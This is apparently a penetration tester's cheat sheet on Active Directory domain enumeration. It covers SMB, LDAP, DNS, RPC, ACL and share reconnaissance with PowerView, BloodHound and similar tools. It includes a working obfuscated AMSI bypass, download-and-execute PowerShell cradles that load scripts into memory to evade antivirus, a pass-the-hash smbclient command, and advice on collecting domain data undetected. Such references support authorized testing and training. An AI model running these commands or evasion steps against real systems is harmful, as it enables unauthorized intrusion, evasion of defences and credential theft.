# Domain Enumeration

{% hint style="info" %}
Commands mentioned here are a combination of windows system built-in commands and automated tools.
{% endhint %}

## Enumerating without Credentials

If you just have access to an AD environment but you don't have any credentials/sessions.

### **Check for null and Guest Access on SMB Services**

**for old versions of windows.**

```
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>

smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>

smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
```

### **Enumerate LDAP**

```
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
```

## Exploitation with Credentials

### Check [crackmapexec](lateral-movement/pass-the-hash-password/crackmapexec.md) and [Impacket ](impacket.md)section.

## **Poisoning the Network**

**Assuming that you are conected to the internal network (part of the domain) but dont have access to any system in the domain.**

#### **check out** [**MITM**](network-poisoning-mitm/) **Section.**

## Bypass AMSI

run this to bypass AMSI in the current powershell terminal that you are using:

```
powershell -ep bypass

SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

#### For more info about AMSI refer to the [AMSI bypass](../../defense-evasion/av-evasion/amsi-bypass.md) in AV Evasion.

## Load scripts in Memory

To avoid signature based detection we should load our tools and scripts directly into target system mmoey:

```
powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')
```

{% hint style="info" %}
In some cases windows defender will be triggered if you try to load scripts from known public sources such as github so its better if you host the script on your own machine or somewhere else.
{% endhint %}

## Load Files/Scripts on Disk

use a powershell cmdlet that acts like Linux wget command:

```
Invoke-WebRequest -UseBasicParsing http://192.168.52.200/Tools/file.exe -OutFile file.exe -Verbose
```

## Loading Enumeration Tools

### [winapsearch](https://github.com/ropnop/windapsearch)

```
git clone https://github.com/ropnop/windapsearch.git

apt install python3-ldap

# enute the AD with credentials via WPAD
python3 windapsearch.py -d megabank.local -u megabank\\Administrator -p "letmein.123" --dc-ip 192.168.56.103 -U -o output

# other options:

 --functionality       Enumerate Domain Functionality level. Possible through anonymous bind
  -G, --groups          Enumerate all AD Groups
  -U, --users           Enumerate all AD Users
  -PU, --privileged-users
                        Enumerate All privileged AD Users. Performs recursive lookups for nested members.
  -C, --computers       Enumerate all AD Computers
  -m GROUP_NAME, --members GROUP_NAME
                        Enumerate all members of a group
  --da                  Shortcut for enumerate all members of group 'Domain Admins'. Performs recursive
                        lookups for nested members.
  --admin-objects       Enumerate all objects with protected ACLs (i.e. admins)
  --user-spns           Enumerate all users objects with Service Principal Names (for kerberoasting)
  --unconstrained-users
                        Enumerate all user objects with unconstrained delegation
  --unconstrained-computers
                        Enumerate all computer objects with unconstrained delegation
  --gpos                Enumerate Group Policy Objects
  -s SEARCH_TERM, --search SEARCH_TERM
                        Fuzzy search for all matching LDAP entries
  -l DN, --lookup DN    Search through LDAP and lookup entry. Works with fuzzy search. Defaults to printing
                        all attributes, but honors '--attrs'
  --custom CUSTOM_FILTER
                        Perform a search with a custom object filter. Must be valid LDAP filter syntax
```

### [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

```
# host the script & load in memory
# from powershell:
iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')

# from cmd:
powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')
```

#### PowerView Cheat Sheet

![](<../../.gitbook/assets/image (171).png>)

![](<../../.gitbook/assets/image (172).png>)

### [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

```
git clone https://github.com/dirkjanm/ldapdomaindump.git
#or
pip install ldapdomaindumpPowerView Cheat Sheet

python ldapdomaindump.py
#or
python -m ldapdomaindump
ldapdomaindump
```

### Enum4linux

```
enum4linux -u administrator -p letmein.1234 -a 192.168.56.103
```

### [ADRecon](https://github.com/sense-of-security/ADRecon)

```
git clone https://github.com/sense-of-security/ADRecon.git

#  run ADRecon on a domain member host
.\ADRecon.ps1

# run ADRecon on a domain member host as a different user.
.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>

# run ADRecon on a non-member host using LDAP
.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>

# run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers

# generate the ADRecon-Report.xlsx based on ADRecon output (CSV Files).
.\ADRecon.ps1 -GenExcel C:\ADRecon-Report-<timestamp>
```

#### When you run ADRecon, a `ADRecon-Report-<timestamp>` folder will be created which will contain ADRecon-Report.xlsx and CSV-Folder with the raw files.

### [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)

```
powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
```

## Domain Mapping (Bloodhound)

### [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)

```
# require: Install-Module -name Az -AllowClobber
# require: Install-Module -name AzureADPreview -AllowClobber
Connect-AzureAD
Connect-AzAccount
. .\AzureHound.ps1
Invoke-AzureHound
```

### [BloodHound](https://github.com/BloodHoundAD/BloodHound)

![](<../../.gitbook/assets/image (298) (1).png>)

```
# run the collector on the machine using SharpHound.exe
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
.\SharpHound.exe -c all -d active.htb -SearchForest
.\SharpHound.exe --EncryptZip --ZipFilename export.zip
.\SharpHound.exe -c all,GPOLocalGroup
.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23


# or run the collector on the machine using Powershell
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
```

Then import the zip/json files into the Neo4J database and query them.

```
root@payload$ apt install bloodhound 

# start BloodHound and the database
root@payload$ neo4j console
# or use docker
root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j

root@payload$ ./bloodhound --no-sandbox
Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
```

{% hint style="info" %}
we can use the exe version without argument and get the same output. download and extract it and upload all files in bloodhound UI.
{% endhint %}

### [sharphound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

### [bloodhound - python](https://github.com/fox-it/BloodHound.py)

{% hint style="info" %}
This needs credentials but its FUD and runs remotely.
{% endhint %}

```
pip install bloodhound
bloodhound-python -c ALL -d megacorp.local -u client1 -p password123 -ns [domain controller ip]
```

#### this will dump all domain info to the attackers machine remotely without being detected but you need to have the credentials for at least a low-privilege user in the domain.

## Domain & System Info

### Domain Info

```
Get-NetDomain
get-netforest
get-netforestdomain
Get-DomainPolicy

#Will show us the policy configurations of the Domain about system access or kerberos
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"
# or
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
```

### get domain controllers

```
Get-NetDomainController
Get-NetDomainController -Domain <DomainName>
```

### **Enum Domain Trust**

```
Get-NetDomainTrust
Get-NetDomainTrust -Domain <DomainName>
```

### **Enum Forest Trust**

```
Get-NetForestDomain
Get-NetForestDomain Forest <ForestName>

#Domains of Forest Enumeration
Get-NetForestDomain
Get-NetForestDomain Forest <ForestName>

#Map the Trust of the Forest
Get-NetForestTrust
Get-NetDomainTrust -Forest <ForestName>
```

## Domain Computers

```
Get-AdComputer -filter *
Get-NetComputer -FullData
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines 
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

#### Get All Computers by Name

This will list all the computers in the domain and only display the hostname

```
Get-ADComputer -filter * | select name
```

#### Get All Computers from an OU

```
Get-ADComputer -SearchBase "OU=DN" -Filter *
```

#### Get a Count of All Computers in Domain

```
Get-ADComputer -filter * | measure
```

#### Get all Windows 10 Computers

Change Windows 10 to any OS you want to search for

```
Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} -property * | select name, operatingsystem
```

#### Get a Count of All computers by Operating System

This will provide a count of all computers and group them by the operating system. A great command to give you a quick inventory of computers in AD.

```
Get-ADComputer -Filter "name -like '*'" -Properties operatingSystem | group -Property operatingSystem | Select Name,Count
```

#### Delete a single Computer

```
Remove-ADComputer -Identity "USER04-SRV4"
```

#### Delete a List of Computer Accounts

Add the hostnames to a text file and run the command below.

```
Get-Content -Path C:ComputerList.txt | Remove-ADComputer
```

#### Delete Computers From an OU

```
Get-ADComputer -SearchBase "OU=DN" -Filter * | Remote-ADComputer
```

## Users & Groups

### **User Hunting**

```
#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain:
Invoke-EnumerateLocalAdmin -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth

#Confirming admin access:
Invoke-UserHunter -CheckAccess
```

***

### Users in the current domain

```
Get-NetUser (Powerview)
Get-NetUser -Username student (Powerview)
Get-ADUser -Filter * -Properties * (Active Directory)
Get-ADUser -Identity student -properties * (Active Directory)
```

### User Properties

```
Get-UserProperty (Powerview)
Get-ADUser username -Properties *
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  (powershell)
```

### Find Local Admins

```
find-localadminaccess -verbose
```

#### Finds which machines users of a specified group are logged into

```
get-help Invoke-UserHunter -examples
Invoke-UserHunter
get-help Invoke-UserHunter
```

### Get admin group members

```
get-netgroupmember -groupname 'administrators'
get-netgroupmember -groupname 'Domain Admins' -recurse
```

#### check logon count for all users in the domain

```
get-userproperty -properties logoncount
```

### last password set time

```
Get-UserProperty -Properties pwdlastset (Powerview)
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -Membertype *Property | select Name        (Active Directory)
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}    (Active Directory)
```

### Get Users by Name

```
get-Aduser -Filter {name -like "*robert*"}
```

### Get All Disable User Accounts

```
Search-ADAccount -AccountDisabled | select name
Search-ADAccount -AccountDisabled
```

Disable User Account

```
Disable-ADAccount -Identity rallen
```

Enable User Account

```
Enable-ADAccount -Identity rallen
```

### Stealing the SID of the krbtgt account

```
Get-ADUser -Identity krbtgt
```

### Find All Locked User Accounts

```
Search-ADAccount -LockedOut
```

Unlock User Account

```
Unlock-ADAccount –Identity john.smith
```

### Get All Accounts with Password Set to Never Expire

```
get-aduser -filter * -properties Name, PasswordNeverExpires | where {$_.passwordNeverExpires -eq "true" } | Select-Object DistinguishedName,Name,Enabled
```

### Get all GPOs by status

```
get-GPO -all | select DisplayName, gpostatus
```

### Listing the group members of group

```
Get-ADGroupMember -Identity [group name ]
```

Get All members Of A Security group

```
Get-ADGroupMember -identity “HR Full”
```

Get Group by keyword

```
get-adgroup -filter * | Where-Object {$_.name -like "*group-name*"}
```

Get all the groups in the current domain PowerView

```
Get-NetGroup
Get-NetGroup *admin*
```

### **Enum Group Policies**

```
Get-NetGPO

# Shows active Policy on specified machine
Get-NetGPO -ComputerName <Name of the PC>
Get-NetGPOGroup

#Get users that are part of a Machine's local Admin group
Find-GPOComputerAdmin -ComputerName <ComputerName>
```

others options:

```
#Get a spesific "string" on a user's attribute
Find-UserField -SearchField Description -SearchTerm "wtver"

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName <ComputerName>

#Enumerate Session Information for a machine
Get-NetSession -ComputerName <ComputerName>

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
```

## **Enum OUs**

```
Get-NetOU -FullData 
Get-NetGPO -GPOname <The GUID of the GPO>
```

## Enum DHCP

When connecting a computer to most enterprise networks, if the Dynamic Host Configuration Protocol (DHCP) is enabled, it will assign an IP address to that computer, and send a lot of information. Nameservers and domain names are usually set through DHCP offer packets. On UNIX-like systems, the /etc/resolv.conf file will store information for name resolution operations after the DHCP offer.

```
nmap --script broadcast-dhcp-discover
```

{% hint style="info" %}
In many cases, there will be MAC address filtering, static IP addressing, VLANs or NAC (Network Access Control) that can prevent testers from obtaining this information. In those situations, wireshark can be used to manually inspect broadcast and multicast packets that travel on the network and find valuable information that could help bypass those mitigations.
{% endhint %}

## Enum LDAP

A lot of information on an AD domain can be obtained through LDAP. Most of the information can only be obtained with an authenticated bind but metadata (naming contexts, dns server name, domain functional level) can be obtainable anonymously, even with anonymous binding disabled.

### ldapdomaindump

```
ldapdomaindump --user 'DOMAIN\USER' --password $PASSWORD --outdir ldapdomaindump $DOMAIN_CONTROLLER
```

{% hint style="info" %}
LDAP anonymous binding is usually disabled but it's worth checking
{% endhint %}

## Enum MSRPC

MS-RPC (Microsoft Remote Procedure Call) is a protocol that allows requesting service from a program on another computer without having to understand the details of that computer's network. An MS-RPC service can be accessed through different transport protocols, among which:

#### . a network SMB pipe (listening ports are 139 & 445)

#### . plain TCP or plain UDP (listening port set at the service creation)

#### . a local SMB pipe

RPC services over an SMB transport, i.e. port 445/TCP, are reachable through "named pipes"' (through the `IPC$` share). There are many interesting named pipes that allow various operations from NULL sessions context, to local administrative context.

### Find exposed services <a href="#find-exposed-services" id="find-exposed-services"></a>

The epmapper (MS-RPC EndPoint Mapper) maps services to ports. It uses port 135/TCP and/or port 593/TCP (for RPC over HTTP).

```
# with rpcdump.py (example with target port 135/TCP)
rpcdump.py -port 135 $TARGET_IP

# with rpcdump.exe (example with target port 593/TCP)
rpcdump.exe -p 593 $TARGET_IP
```

### Null sessions <a href="#null-sessions" id="null-sessions"></a>

NULL sessions are unauthenticated SMB sessions that allow attackers to operate RPC calls through SMB named pipes without being authenticated first. This allows for many recon techniques like the enumeration of domain and local information (users, groups, RIDs, SIDs, policies, etc.)

### Recon through interesting named pipes <a href="#recon-through-interesting-named-pipes" id="recon-through-interesting-named-pipes"></a>

The Samba utility named rpcclient can be used to operate recon through MS-RPC services behind SMB named pipes. It offers multiple useful commands.

```
lsaquery: get domain name and SID (Security IDentifier)
enumalsgroups builtin: list local groups, returns RIDs (Relative IDs)
queryaliasmem <RID>: list local group members, returns SIDs
lookupsids <SID>: resolve SID to name
lookupnames <NAME>: resolve name to SID
enumdomusers: list users, equivalent to net user /domain
enumdomgroups: list groups equivalent to net group /domain
queryuser <rid/name>: obtain info on a user, equivalent to net user <user> /domain
querygroupmem <rid>: obtain group members, equivalent to net group <group> /domain
getdompwinfo: get password policy

# example
rpcclient -c "command1,command2" $TARGET_IP
```

### RID Cycling <a href="#rid-cycling" id="rid-cycling"></a>

RID Cycling is a method that allows attackers to enumerate domain objects by bruteforcing or guessing RIDs and SIDs, based on the fact that RIDs are sequential.

The Python [ridenum](domain-enumeration.md#enumerating-with-no-access-creds) script can be used to operate that recon technique, with a Null session or with an authenticated one.

{% hint style="info" %}
The enum4linux tool can be used to easily operate fast recon through MS-RPC, with Null session or not.
{% endhint %}

## Enum DNS

AD-DS (Active Directory Domain Services) rely on DNS SRV RR (service location resource records). Those records can be queried to find the location of some servers: the global catalog, LDAP servers, the Kerberos KDC and so on.

### dnsutil

nslookup is a DNS client that can be used to query SRV records. It usually comes with the dnsutil package.

```
# find the PDC (Principal Domain Controller)
nslookup -type=srv _ldap._tcp.pdc._msdcs.$FQDN_DOMAIN
​
# find the DCs (Domain Controllers)
nslookup -type=srv _ldap._tcp.dc._msdcs.$FQDN_DOMAIN
​
# find the GC (Global Catalog, i.e. DC with extended data)
nslookup -type=srv gc._msdcs.$FQDN_DOMAIN
​
# Other ways to find services hosts that may be DCs 
nslookup -type=srv _kerberos._tcp.$FQDN_DOMAIN
nslookup -type=srv _kpasswd._tcp.$FQDN_DOMAIN
nslookup -type=srv _ldap._tcp.$FQDN_DOMAIN
```

### nmap

```
nmap --script dns-srv-enum --script-args dns-srv-enum.domain=$FQDN_DOMAIN
```

## Enum NBT-NS

```
# Name lookup on a range
nbtscan -r $SUBNET/$MASK
​
# Find names and workgroup from an IP address
nmblookup -A $IPAdress
```

## **Enum ACLs**

```
# Returns the ACLs associated with the specified account
Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

#Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"

```

### Get ACLs associated with the specified object

```
Get-ObjectACL -SamAccountName user123 -ResolveGUIDs
```

### Get ACLs associated with the specified prefix to be used for search

```
Get-objectACL -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```

### GenericWrite

```
Get-ObjectAcl -SamAccountName * –ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
```

## **Enum Shares**

#### from outside:

```
smbmap -H 10.10.10.100    # null session
smbmap -H 10.10.10.100 -R # recursive listing
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18


smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
use Sharename # select a Sharename
cd Folder     # move inside a folder
ls            # list files


pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
ls  # list files
cd  # move inside a folder
get # download files
put # replace a file
```

Mount a share

```
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
```

#### from inside:

```
get-netshare
get-dfsshare
get-netfileserver

#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
```
